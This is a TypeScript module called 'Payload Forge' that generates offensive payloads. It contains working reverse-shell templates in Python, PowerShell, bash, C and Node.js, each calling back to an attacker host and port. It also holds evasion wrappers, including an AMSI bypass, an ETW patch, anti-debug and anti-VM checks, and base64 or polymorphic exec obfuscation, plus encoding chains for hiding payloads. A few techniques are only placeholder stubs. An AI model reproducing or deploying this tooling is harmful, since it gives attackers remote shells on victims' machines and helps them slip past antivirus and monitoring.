/**
 * Payload Forge
 * 
 * Multi-stage encoding, polymorphic shellcode generation,
 * AV evasion techniques, and custom payload building.
 */

export type EncodingType = "base64" | "xor" | "rot13" | "hex" | "url" | "unicode" | "aes256";
export type PayloadFormat = "python" | "powershell" | "bash" | "c" | "csharp" | "javascript" | "raw";
export type Platform = "linux_x64" | "linux_x86" | "windows_x64" | "windows_x86" | "macos_x64" | "macos_arm64";

export interface EncodingChain {
  steps: { encoder: EncodingType; key?: string; iterations?: number }[];
}

export interface PayloadConfig {
  type: "reverse_shell" | "bind_shell" | "stager" | "dropper" | "custom";
  platform: Platform;
  format: PayloadFormat;
  lhost?: string;
  lport?: number;
  encoding?: EncodingChain;
  evasion: EvasionTechnique[];
  customCode?: string;
}

export type EvasionTechnique =
  | "sleep_delay"
  | "process_hollowing"
  | "syscall_direct"
  | "string_obfuscation"
  | "anti_debug"
  | "anti_vm"
  | "amsi_bypass"
  | "etw_patch"
  | "unhook_ntdll"
  | "polymorphic_wrapper";

export interface GeneratedPayload {
  code: string;
  format: PayloadFormat;
  size: number;
  encodingChain: string[];
  evasionTechniques: string[];
  hash: string;
  notes: string[];
}

/** Encode data through a chain of encoders */
export function encodeChain(data: string, chain: EncodingChain): string {
  let result = data;
  for (const step of chain.steps) {
    const iterations = step.iterations || 1;
    for (let i = 0; i < iterations; i++) {
      result = applyEncoding(result, step.encoder, step.key);
    }
  }
  return result;
}

function applyEncoding(data: string, encoder: EncodingType, key?: string): string {
  switch (encoder) {
    case "base64":
      return Buffer.from(data).toString("base64");
    case "hex":
      return Buffer.from(data).toString("hex");
    case "xor": {
      const xorKey = key || "rogue";
      return Array.from(data)
        .map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ xorKey.charCodeAt(i % xorKey.length)))
        .join("");
    }
    case "rot13":
      return data.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      });
    case "url":
      return encodeURIComponent(data);
    case "unicode":
      return Array.from(data)
        .map((c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`)
        .join("");
    case "aes256":
      // Placeholder — would use crypto module in production
      return Buffer.from(`AES256[${key || "defaultkey"}]:${data}`).toString("base64");
    default:
      return data;
  }
}

/** Decode an encoding chain in reverse */
export function decodeChain(data: string, chain: EncodingChain): string {
  let result = data;
  const reversed = [...chain.steps].reverse();
  for (const step of reversed) {
    const iterations = step.iterations || 1;
    for (let i = 0; i < iterations; i++) {
      result = applyDecoding(result, step.encoder, step.key);
    }
  }
  return result;
}

function applyDecoding(data: string, encoder: EncodingType, key?: string): string {
  switch (encoder) {
    case "base64":
      return Buffer.from(data, "base64").toString("utf-8");
    case "hex":
      return Buffer.from(data, "hex").toString("utf-8");
    case "xor":
      return applyEncoding(data, "xor", key); // XOR is its own inverse
    case "rot13":
      return applyEncoding(data, "rot13"); // ROT13 is its own inverse
    case "url":
      return decodeURIComponent(data);
    default:
      return data;
  }
}

/** Generate reverse shell payload */
export function generateReverseShell(platform: Platform, format: PayloadFormat, lhost: string, lport: number): string {
  const templates: Record<string, Record<string, string>> = {
    python: {
      linux_x64: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`,
      windows_x64: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe"])`,
    },
    powershell: {
      windows_x64: `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
      windows_x86: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    },
    bash: {
      linux_x64: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      linux_x86: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      macos_x64: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      macos_arm64: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    },
    c: {
      linux_x64: `#include <stdio.h>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nint main() {\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(${lport});\n    inet_pton(AF_INET, "${lhost}", &addr.sin_addr);\n    connect(sock, (struct sockaddr *)&addr, sizeof(addr));\n    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);\n    execve("/bin/sh", NULL, NULL);\n    return 0;\n}`,
    },
    javascript: {
      linux_x64: `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${lport},"${lhost}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
      windows_x64: `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("cmd.exe",[]);var client=new net.Socket();client.connect(${lport},"${lhost}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
    },
  };

  const platformTemplates = templates[format];
  if (!platformTemplates) return `// No template for format: ${format}`;
  
  return platformTemplates[platform] || platformTemplates[Object.keys(platformTemplates)[0]] || `// No template for ${platform}/${format}`;
}

/** Generate evasion wrappers */
export function generateEvasionWrapper(technique: EvasionTechnique, payload: string, format: PayloadFormat): string {
  const wrappers: Record<EvasionTechnique, Record<string, (p: string) => string>> = {
    sleep_delay: {
      python: (p) => `import time\ntime.sleep(30)  # Sandbox timeout evasion\n${p}`,
      powershell: (p) => `Start-Sleep -Seconds 30\n${p}`,
      bash: (p) => `sleep 30\n${p}`,
    },
    anti_debug: {
      python: (p) => `import sys,ctypes\nif sys.platform == 'win32':\n    if ctypes.windll.kernel32.IsDebuggerPresent():\n        sys.exit(0)\n${p}`,
      powershell: (p) => `if ([System.Diagnostics.Debugger]::IsAttached) { exit }\n${p}`,
      c: (p) => `#include <windows.h>\nif (IsDebuggerPresent()) return 0;\n${p}`,
    },
    anti_vm: {
      python: (p) => `import subprocess\nvm_indicators = ['vmware','virtualbox','qemu','xen','hyperv']\nresult = subprocess.run(['systeminfo'], capture_output=True, text=True)\nif any(i in result.stdout.lower() for i in vm_indicators):\n    exit(0)\n${p}`,
      powershell: (p) => `$vm = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer\nif ($vm -match 'VMware|VirtualBox|QEMU|Xen') { exit }\n${p}`,
    },
    amsi_bypass: {
      powershell: (p) => `[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils').GetField('amsi'+'Init'+'Failed','NonPublic,Static').SetValue($null,$true)\n${p}`,
    },
    etw_patch: {
      powershell: (p) => `$patch = [byte[]](0xc3)\n$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress ntdll.dll EtwEventWrite), [Func[IntPtr]])\n[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 1)\n${p}`,
    },
    string_obfuscation: {
      python: (p) => {
        const encoded = Buffer.from(p).toString("base64");
        return `import base64;exec(base64.b64decode("${encoded}").decode())`;
      },
      powershell: (p) => {
        const encoded = Buffer.from(p, "utf-8").toString("base64");
        return `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("${encoded}")) | iex`;
      },
    },
    polymorphic_wrapper: {
      python: (p) => {
        const varName = `_${Math.random().toString(36).slice(2, 8)}`;
        const encoded = Buffer.from(p).toString("base64");
        return `import base64 as ${varName}\nexec(${varName}.b64decode("${encoded}").decode())`;
      },
    },
    process_hollowing: { c: (p) => `// Process hollowing stub\n${p}` },
    syscall_direct: { c: (p) => `// Direct syscall stub\n${p}` },
    unhook_ntdll: { c: (p) => `// NTDLL unhooking stub\n${p}` },
  };

  const techniqueWrappers = wrappers[technique];
  if (!techniqueWrappers) return payload;

  const wrapper = techniqueWrappers[format];
  if (!wrapper) return payload;

  return wrapper(payload);
}

/** Full payload generation pipeline */
export function forgePayload(config: PayloadConfig): GeneratedPayload {
  let code: string;

  // Generate base payload
  if (config.type === "custom" && config.customCode) {
    code = config.customCode;
  } else if (config.type === "reverse_shell") {
    code = generateReverseShell(config.platform, config.format, config.lhost || "0.0.0.0", config.lport || 4444);
  } else {
    code = `// ${config.type} payload for ${config.platform}`;
  }

  // Apply evasion techniques
  for (const technique of config.evasion) {
    code = generateEvasionWrapper(technique, code, config.format);
  }

  // Apply encoding chain
  const encodingChainLabels: string[] = [];
  if (config.encoding) {
    for (const step of config.encoding.steps) {
      encodingChainLabels.push(`${step.encoder}${step.key ? `(key=${step.key})` : ""}${step.iterations && step.iterations > 1 ? `x${step.iterations}` : ""}`);
    }
    code = encodeChain(code, config.encoding);
  }

  // Calculate hash
  let hash = 0;
  for (let i = 0; i < code.length; i++) {
    hash = ((hash << 5) - hash + code.charCodeAt(i)) | 0;
  }

  return {
    code,
    format: config.format,
    size: code.length,
    encodingChain: encodingChainLabels,
    evasionTechniques: config.evasion,
    hash: Math.abs(hash).toString(16).padStart(8, "0"),
    notes: [
      `Platform: ${config.platform}`,
      `Type: ${config.type}`,
      config.evasion.length > 0 ? `Evasion: ${config.evasion.join(", ")}` : "No evasion applied",
    ],
  };
}
